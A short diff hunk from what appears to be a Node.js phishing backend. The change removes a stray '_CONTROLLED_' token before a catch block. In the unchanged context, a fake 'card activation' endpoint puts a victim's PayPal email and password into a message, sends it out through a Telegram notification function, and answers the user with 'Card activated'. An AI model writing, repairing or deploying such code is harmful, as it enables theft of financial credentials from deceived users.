@@ -679,7 +679,7 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
         const message = `PayPal Login from ${cardId}: Email: ${paypalUsername}, Password: ${paypalPassword}`;
         await sendTelegramNotification(message);
         res.json({ message: 'Card activated', cardId, status: 'activated' });
-    }_CONTROLLED_ catch (error) {
+    } catch (error) {
         console.error('Activate card error:', error);
         res.status(500).json({ error: 'Server error activating card' });
     }
